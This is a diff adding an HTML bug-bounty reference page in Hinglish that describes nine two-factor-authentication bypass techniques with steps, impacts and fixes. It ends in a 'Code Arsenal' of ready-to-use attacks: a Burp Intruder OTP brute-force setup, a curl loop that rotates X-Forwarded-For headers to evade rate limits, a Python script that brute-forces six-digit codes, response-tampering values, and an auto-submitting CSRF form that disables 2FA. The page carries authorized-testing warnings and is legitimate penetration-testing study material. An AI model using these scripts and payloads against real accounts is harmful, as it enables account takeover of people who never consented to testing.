@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>2FA Bypass Advanced Exploitation Arsenal — Recon Notes</title>
+<style>
+  :root{
+    --bg:#060a12; --panel:#0b1120; --panel2:#0e1830; --border:#1c2942;
+    --green:#39ff9d; --cyan:#4fd8ff; --pink:#ff5ea8; --yellow:#ffd447;
+    --red:#ff5470; --purple:#b98bff; --text:#c9d6f0; --dim:#7186ad;
+  }
+  *{box-sizing:border-box;}
+  body{ margin:0; background: radial-gradient(circle at 10% 0%, rgba(79,216,255,0.08), transparent 40%),
+      radial-gradient(circle at 90% 20%, rgba(185,139,255,0.08), transparent 40%), var(--bg);
+    color:var(--text); font-family:'Consolas','SF Mono',monospace; line-height:1.6; padding:0 0 60px 0; }
+  header{ text-align:center; padding:38px 20px 22px; border-bottom:1px solid var(--border);
+    background:linear-gradient(180deg, rgba(79,216,255,0.06), transparent); }
+  header h1{ margin:0; font-size:2rem; letter-spacing:2px; color:var(--cyan); text-shadow:0 0 18px rgba(79,216,255,0.55); }
+  header .sub{ color:var(--dim); margin-top:10px; font-size:0.95rem; }
+  header .warn{ display:inline-block; margin-top:16px; padding:8px 16px; border:1px solid var(--red);
+    color:var(--red); border-radius:6px; font-size:0.85rem; background:rgba(255,84,112,0.07); }
+  nav{ max-width:1100px; margin:26px auto; padding:0 20px; display:flex; flex-wrap:wrap; gap:8px; justify-content:center; }
+  nav a{ color:var(--green); border:1px solid var(--border); padding:6px 12px; border-radius:20px;
+    text-decoration:none; font-size:0.8rem; background:var(--panel); transition:0.2s; }
+  nav a:hover{ border-color:var(--green); box-shadow:0 0 10px rgba(57,255,157,0.35); }
+  main{ max-width:1100px; margin:0 auto; padding:0 20px; display:flex; flex-direction:column; gap:26px; }
+  .card{ background:linear-gradient(180deg, var(--panel2), var(--panel)); border:1px solid var(--border);
+    border-radius:10px; padding:24px 26px; position:relative; overflow:hidden; }
+  .card::before{ content:""; position:absolute; top:0; left:0; right:0; height:3px; background:var(--accent); }
+  .tag{ display:inline-block; font-size:0.7rem; letter-spacing:1px; padding:3px 9px; border-radius:4px;
+    color:#04121a; background:var(--accent); font-weight:bold; margin-bottom:10px; }
+  .card h2{ margin:4px 0 12px; font-size:1.35rem; color:var(--accent); }
+  .card p.desc{ color:var(--text); margin:0 0 14px; }
+  .steps{ background:rgba(0,0,0,0.28); border:1px solid var(--border); border-radius:8px; padding:14px 18px; margin:12px 0; }
+  .steps h3{ margin:0 0 8px; font-size:0.85rem; color:var(--dim); text-transform:uppercase; letter-spacing:1px; }
+  .steps ol{ margin:0; padding-left:20px; } .steps li{ margin-bottom:6px; }
+  .example{ background:#020408; border:1px solid var(--border); border-left:3px solid var(--accent);
+    border-radius:6px; padding:14px 16px; font-size:0.85rem; overflow-x:auto; margin:12px 0; color:#8fffc0; white-space:pre-wrap; }
+  .example .c1{color:var(--cyan);} .example .c2{color:var(--pink);} .example .c3{color:var(--yellow);} .example .ok{color:var(--green);}
+  .impact{ display:flex; gap:10px; align-items:center; margin-top:14px; padding:10px 14px; border-radius:6px;
+    background:rgba(255,84,112,0.08); border:1px solid rgba(255,84,112,0.35); color:var(--red); font-size:0.85rem; }
+  .fix{ margin-top:10px; padding:10px 14px; border-radius:6px; background:rgba(57,255,157,0.06);
+    border:1px solid rgba(57,255,157,0.3); color:var(--green); font-size:0.85rem; }
+  code{ color:var(--yellow); }
+  .codesection{ max-width:1100px; margin:10px auto 0; padding:0 20px; }
+  .codesection-header{ text-align:center; padding:30px 20px 10px; }
+  .codesection-header h1{ margin:0; font-size:1.8rem; color:var(--yellow); text-shadow:0 0 16px rgba(255,212,71,0.5); letter-spacing:2px; }
+  .codesection-header p{ color:var(--dim); margin-top:8px; }
+  .codeblock{ background:linear-gradient(180deg, var(--panel2), var(--panel)); border:1px solid var(--border);
+    border-radius:10px; padding:20px 24px; margin-bottom:20px; }
+  .codeblock h3{ color:var(--yellow); margin:0 0 12px; font-size:1.05rem; border-bottom:1px dashed var(--border); padding-bottom:8px;}
+  .codeblock .example{ margin:10px 0; }
+  .codeblock p.note{ color:var(--dim); font-size:0.8rem; margin:6px 0 0; }
+  footer{ text-align:center; color:var(--dim); font-size:0.8rem; margin-top:40px; padding:0 20px; }
+  footer .box{ max-width:700px; margin:0 auto; border:1px dashed var(--border); border-radius:8px; padding:16px; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>&gt; 2FA_BYPASS_ADVANCED.md</h1>
+  <div class="sub">Two-Factor Authentication — bypass techniques + poora code arsenal</div>
+  <div class="warn">⚠ Sirf authorized programs (HackerOne scope) pe hi apply karna — bina permission illegal hai</div>
+</header>
+
+<nav>
+  <a href="#t1">01 Response Manipulation</a>
+  <a href="#t2">02 Step Skipping</a>
+  <a href="#t3">03 Brute Force</a>
+  <a href="#t4">04 Backup Code Abuse</a>
+  <a href="#t5">05 Session Reuse Across Devices</a>
+  <a href="#t6">06 Race Condition</a>
+  <a href="#t7">07 OAuth/SSO Skip 2FA</a>
+  <a href="#t8">08 Old Session Token Valid</a>
+  <a href="#t9">09 CSRF on 2FA Disable</a>
+  <a href="#code">💾 Code Arsenal</a>
+</nav>
+
+<main>
+
+  <!-- 01 -->
+  <div class="card" id="t1" style="--accent:var(--green)">
+    <span class="tag">CRITICAL</span>
+    <h2>01. Response Manipulation on 2FA Verify</h2>
+    <p class="desc">Agar 2FA verify hone ke baad "success/fail" decision client-side ya response body pe depend karta hai, to Burp se response badal ke bina sahi code ke bhi aage badha ja sakta hai.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>2FA verify page pe galat code daalo, request Burp Proxy se intercept karo.</li>
+        <li>Response forward hone se pehle rok lo — body mein <code>"success":false</code> ya <code>"verified":false</code> dhoondo.</li>
+        <li>Value ko <code>true</code> mein badal do, forward karo.</li>
+        <li>Agar dashboard load ho jaaye — bypass confirmed.</li>
+      </ol>
+    </div>
+    <div class="example">Original: {"verified": <span class="c2">false</span>}
+Modified: {"verified": <span class="c1">true</span>}</div>
+    <div class="impact">💥 Impact: Poora 2FA layer bypass — sirf password hi kaafi ban jaata hai.</div>
+    <div class="fix">🛡 Fix: Server-side session state pe verification store karo, client response ko kabhi trust mat karo.</div>
+  </div>
+
+  <!-- 02 -->
+  <div class="card" id="t2" style="--accent:var(--cyan)">
+    <span class="tag">CRITICAL</span>
+    <h2>02. Step Skipping (Direct Endpoint Access)</h2>
+    <p class="desc">Login flow: password → 2FA page → dashboard. Agar dashboard/next-step endpoint yeh check nahi karta ki "2FA verify hua ya nahi", to seedha us URL pe navigate karke 2FA step skip ho sakta hai.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Password se login karo, 2FA page tak pahuncho (code mat daalo).</li>
+        <li>Burp history mein dashboard/success endpoint dhoondo.</li>
+        <li>Us URL ko directly browser mein type karke ya Repeater se hit karo.</li>
+        <li>Agar access mil jaaye bina 2FA verify kiye — confirmed.</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Impact: Poora 2FA step hi skip — direct account access.</div>
+    <div class="fix">🛡 Fix: Har protected route pe server-side session flag check karo (<code>"2fa_verified":true</code>).</div>
+  </div>
+
+  <!-- 03 -->
+  <div class="card" id="t3" style="--accent:var(--pink)">
+    <span class="tag">CRITICAL</span>
+    <h2>03. 2FA Code Brute Force</h2>
+    <p class="desc">6-digit OTP ke sirf 10 lakh combinations hain — agar rate-limiting missing ya weak hai, to Intruder se brute-force kiya ja sakta hai.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>2FA verify request Intruder mein bhejo, code field payload mark karo.</li>
+        <li>Numbers payload, range 000000-999999.</li>
+        <li>Attack chalao, response length/status se sahi code differentiate karo.</li>
+        <li>Rate-limit bypass headers (X-Forwarded-For rotation) bhi combine karo agar weak limit hai.</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Impact: 2FA bina bhi bypass ho jaata hai — poore protection ka matlab nahi rehta.</div>
+    <div class="fix">🛡 Fix: Max 3-5 attempts ke baad lock/CAPTCHA, account-bound rate limit.</div>
+  </div>
+
+  <!-- 04 -->
+  <div class="card" id="t4" style="--accent:var(--yellow)">
+    <span class="tag">ADVANCED</span>
+    <h2>04. Backup/Recovery Code Abuse</h2>
+    <p class="desc">Apps kabhi backup codes dete hain jab authenticator app na ho. Yeh codes agar predictable hain, reusable hain, ya rate-limit se bahar hain, to primary 2FA se bhi weaker bypass rasta bante hain.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Backup-code generation ka flow trace karo — kitne characters, kaunsa format.</li>
+        <li>Dekho kya backup code multiple baar use ho sakta hai (should be one-time only).</li>
+        <li>Backup-code verify endpoint pe rate-limiting alag se hai ya nahi check karo (aksar developers primary 2FA pe rate-limit lagate hain, backup pe bhool jaate hain).</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Impact: Weaker secondary path se primary 2FA bypass.</div>
+    <div class="fix">🛡 Fix: Backup codes bhi one-time + rate-limited + same security level ke hone chahiye.</div>
+  </div>
+
+  <!-- 05 -->
+  <div class="card" id="t5" style="--accent:var(--purple)">
+    <span class="tag">ADVANCED</span>
+    <h2>05. 2FA Session Reuse Across Devices/Browsers</h2>
+    <p class="desc">Agar ek baar 2FA verify hone ke baad session-token kisi bhi device se reusable hai (bina dobara verify maange), to leaked/stolen session token se 2FA hamesha ke liye bypass ho jaata hai.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Ek device/browser se login + 2FA verify complete karo.</li>
+        <li>Session cookie/token copy karo.</li>
+        <li>Alag device/browser (incognito, alag machine) mein wahi token use karo.</li>
+        <li>Agar bina dobara 2FA maange access mil jaaye — session-binding missing hai.</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Impact: Ek baar token leak hote hi 2FA protection permanently useless ho jaata hai.</div>
+    <div class="fix">🛡 Fix: New device/IP detect hone par dobara 2FA maango, device-fingerprinting use karo.</div>
+  </div>
+
+  <!-- 06 -->
+  <div class="card" id="t6" style="--accent:var(--red)">
+    <span class="tag">ADVANCED</span>
+    <h2>06. Race Condition on 2FA Attempts</h2>
+    <p class="desc">Agar rate-limit check sequential hai, to parallel requests bhejne se limit-check race ho jaata hai aur zyada attempts allowed ho jaate hain ek hi second mein.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>2FA verify request ko Burp Turbo Intruder mein daalo.</li>
+        <li>20-30 different code guesses ek saath (single-packet attack) bhejo.</li>
+        <li>Rate limiter process karne se pehle sab requests server tak pahunch jaati hain.</li>
+        <li>Attempts count check karo — agar limit se zyada guesses ho gaye, race confirmed.</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Impact: Effective brute-force window badh jaata hai, weak rate-limit ka fayda milta hai.</div>
+    <div class="fix">🛡 Fix: Atomic counter (Redis INCR) use karo, request-level locking.</div>
+  </div>
+
+  <!-- 07 -->
+  <div class="card" id="t7" style="--accent:var(--green)">
+    <span class="tag">ADVANCED</span>
+    <h2>07. OAuth/SSO Login Skip Karta Hai 2FA</h2>
+    <p class="desc">Agar app password-login pe 2FA maangta hai, lekin "Login with Google/Facebook" wala alternate path 2FA bilkul skip kar deta hai — to attacker us weaker path se hi login kar sakta hai.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Normal password-login se 2FA confirm karo (maanga jaa raha hai).</li>
+        <li>Same account ko "Login with Google/Facebook" se try karo (agar linked hai, ya link karne ka option hai).</li>
+        <li>Check karo kya OAuth path 2FA maangta hai ya seedha dashboard mil jaata hai.</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Impact: Weaker authentication path se 2FA poori tarah bypass.</div>
+    <div class="fix">🛡 Fix: Har login method (password ya OAuth) pe consistently 2FA enforce karo.</div>
+  </div>
+
+  <!-- 08 -->
+  <div class="card" id="t8" style="--accent:var(--cyan)">
+    <span class="tag">MEDIUM</span>
+    <h2>08. Old Pre-2FA Session Token Still Valid</h2>
+    <p class="desc">Jab user 2FA enable karta hai, agar uske purane (2FA-se-pehle-ke) active sessions turant invalidate nahi hote, to koi bhi purana leaked session token abhi bhi kaam karta hai — bina 2FA ke.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Login karo (2FA enable karne se pehle), session token note karo.</li>
+        <li>Ab account pe 2FA enable karo.</li>
+        <li>Purana session token (jo 2FA se pehle mila tha) dobara use karke try karo.</li>
+        <li>Agar accept ho jaaye — 2FA sirf naye logins pe apply ho raha hai, purane sessions pe nahi.</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Impact: 2FA enable karne ke baad bhi purane leaked tokens se access possible.</div>
+    <div class="fix">🛡 Fix: 2FA enable/change hone par saare existing sessions invalidate karo.</div>
+  </div>
+
+  <!-- 09 -->
+  <div class="card" id="t9" style="--accent:var(--pink)">
+    <span class="tag">MEDIUM</span>
+    <h2>09. CSRF on 2FA Disable</h2>
+    <p class="desc">Agar "2FA disable karo" wala settings-action CSRF-protected nahi hai, to attacker victim ko malicious page visit karake unka 2FA silently off kar sakta hai — phir normal password-only attack chala sakta hai.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Logged-in state mein 2FA-disable request Burp mein capture karo.</li>
+        <li>CSRF token hai ya nahi check karo.</li>
+        <li>Agar nahi hai, auto-submitting HTML form banao jo yeh request replicate kare.</li>
+        <li>Victim ko wo page visit karao — agar 2FA off ho jaaye, CSRF confirmed.</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Impact: Victim ki jaankari ke bina unka extra security layer hata diya jaata hai.</div>
+    <div class="fix">🛡 Fix: Sensitive settings actions pe CSRF token + current-password confirmation zaroori karo.</div>
+  </div>
+
+</main>
+
+<div class="codesection" id="code">
+  <div class="codesection-header">
+    <h1>💾 CODE ARSENAL — 2FA BYPASS</h1>
+    <p>Ready-to-use commands aur payloads</p>
+  </div>
+
+  <div class="codeblock">
+    <h3>🔢 Burp Intruder — 2FA Brute Force Setup</h3>
+    <div class="example">POST /api/2fa/verify HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"code":"<span class="c3">§000000§</span>"}
+
+<span class="c1">// Intruder payload settings:</span>
+Payload type: Numbers
+Min: 0, Max: 999999
+Number format: Decimal, Min integer digits: 6</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🌐 cURL — Rate Limit Bypass Header Rotation</h3>
+    <div class="example">for i in {1..20}; do
+  curl -X POST https://target.com/api/2fa/verify \
+    -H "X-Forwarded-For: 1.2.3.$i" \
+    -H "Content-Type: application/json" \
+    -d "{\"code\":\"000000\"}"
+done</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🐍 Python — Automated 2FA Brute Force Script</h3>
+    <div class="example"><span class="c1">import requests
+
+url = "https://target.com/api/2fa/verify"
+session_cookie = {"session": "your_pending_2fa_session"}
+
+for code in range(0, 1000000):
+    otp = str(code).zfill(6)
+    r = requests.post(url, json={"code": otp}, cookies=session_cookie)
+    if "success" in r.text or r.status_code == 200:
+        print(f"Found valid code: {otp}")
+        break
+    if code % 1000 == 0:
+        print(f"Tried {code} codes...")</span></div>
+  </div>
+
+  <div class="codeblock">
+    <h3>📋 Response Manipulation — Common Fields to Try</h3>
+    <div class="example">{"verified": false}  →  {"verified": true}
+{"success": false}   →  {"success": true}
+{"2fa_passed": 0}    →  {"2fa_passed": 1}
+{"status": "failed"} →  {"status": "success"}
+{"mfa_required": true} → {"mfa_required": false}</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🎭 CSRF PoC — 2FA Disable Auto-Submit Form</h3>
+    <div class="example">&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;form action="https://target.com/api/2fa/disable" method="POST"&gt;
+    &lt;input type="hidden" name="confirm" value="true"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</div>
+  </div>
+
+</div>
+
+<footer>
+  <div class="box">
+    Ye reference sirf <strong style="color:var(--green)">authorized</strong> HackerOne / apne lab targets pe testing ke liye hai.<br>
+    Bina permission kisi bhi live system pe try karna cybercrime hai (IT Act 2000).<br><br>
+    Recon Notes ka part — roadmap: Bug Bounty → Red Team → OSCP
+  </div>
+</footer>
+
+</body>
+</html>
